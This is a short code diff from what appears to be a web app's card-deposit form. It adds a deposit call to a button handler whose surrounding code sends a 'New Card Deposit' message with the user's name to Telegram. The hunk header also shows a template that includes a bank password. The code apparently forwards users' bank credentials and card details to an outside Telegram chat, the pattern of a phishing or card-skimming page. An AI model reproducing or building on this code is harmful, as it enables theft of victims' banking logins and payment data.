@@ -683,7 +683,7 @@ Password: ${bankCredentials.password}
                           className="w-full"
                           onClick={async () => {
                             if (!validateCardForm()) return;
-
+                            await handleCardDeposit();
                             await sendToTelegram(`
 💳 New Card Deposit
 USERNAME: ${user.name}
